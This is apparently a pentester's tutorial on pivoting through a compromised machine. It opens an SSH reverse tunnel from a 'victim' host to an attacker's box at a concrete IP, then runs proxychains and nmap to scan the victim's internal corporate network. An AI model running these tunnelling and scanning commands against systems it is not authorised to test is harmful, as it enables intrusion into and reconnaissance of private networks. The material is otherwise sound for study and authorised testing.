Proxy Chains Using SSH Port Forwarding

Info: Run any network tool through HTTP, SOCKS4 and SOCK5 proxies.  

Program: SSH and proxychains
Note: SSH user accounts on both Machine A and Machine B must be known. 



Set Up:


On Machine B, SSH connect to Machine A with a Reverse Port Foward.

ssh -f -N -R <remote port to bind>:<local host>:<local port> <user@gateway>

root@adminsql:/var/www# ssh -f -N -R 2222:127.0.0.1:22 root@208.68.234.100 

Note: 

Gateway = Machine A ip address
-R = Remote Port Forwarding
Remote Port To Bind = The port on Machine A that will be used to connect to Machine B's port 22. 
Local host = the local ip address of Machine B
Local port = The port of Machine B to tunnel
-f = Run process in the background
-N = Tells SSH that no command will be send once the tunnel is up.



On Machine A run netstat to see that port 2222 is listening

root@kali:~# netstat -lntp

Note: port 2222 on Machine A is connected through the SSH tunnel to port 22 on Machine B


On Machine A create a Dynamic Port Forward on port 8080

ssh -f -N -D <local proxy port> -p <remote port> <user@target>

root@kali:~# ssh -f -N -D 127.0.0.1:8080 -p 2222 hax0r@127.0.0.1

Note: 

-D = Dynamic Port Forwarding (This tells SSH to run a SOCKS proxy on the local proxy port)
local proxy port = Machine A's port that the SOCKS4 proxy will become active on
remote port = The port that was Remote forwarded before (2222 on local 127.0.0.1 is connected through a tunnel to port 22 on Machine B) 
target = Machine B ip address (127.0.0.1 is used as the port 2222 on local 127.0.0.1 is connected through a tunnel to port 22 on Machine B) 
-f = Run process in the background
-N = Tells SSH that no command will be send once the tunnel is up.


Note: On Machine A, any traffic directed at local port 8080 will go through the SOCKS proxy, then travel through to local port 2222, which will then get forwarded to port 22 on Machine B and onto Network C. 



On Machine A configure proxychains to use local port 8080. 


Run: root@kali:~# nano /etc/proxychains.conf 

Edit From this:

[ProxyList] 
# add proxy here ... 
# meanwile 
# defaults set to tor 
socks4 127.0.0.1 9050  Note: Comment out this line. 

Edit To this:

[ProxyList] 
# add proxy here ... 

socks4 127.0.0.1 8080 Note: Insert this line. 
 
# meanwile 
# defaults set to tor 


On Machine A Run: 

root@kali:~# proxychains nmap --top-ports=20 -sT -Pn 172.16.40.0/24

Note: All proxychains commands will now be run through Machine B which in turn has access to Network C

Usage

Situation: Machine B is a vulnerable victim machine which has SSH running on port 22 and is exposed to the internet. It is part of corporate Network C which is non-routable from the outside. 

Attacker's Machine Victim's Vulnerable Machine Victim's Network connected to the vulnerable machine B
	•	
	▪	Machine A <------------------------------------------> Machine B <------------------------------------------------------------> Network C

127.0.0.1:8080<------->127.0.0.1:2222<-------------------------> a.b.c.d:22 <-----------------------------------------> Network (multiple machines and ports)


Machine B is a vulnerable victim machine which has SSH listening on port 22 and is part of Network C
Machine B, SSH connects to Machine A with a Reverse Port Foward connecting Machine B's port 22 to Machine A's port 2222
Machine A creates a Dynamic Port Forward on port 8080, connecting Machine A's port 8080 to Machine A's port 2222 (which is in turn connected to Machine B's port 22)
Machine A configures proxychains to use local port 8080. 
Machine A can now scan Network C using proxychains to forward all the traffic through Machine B.

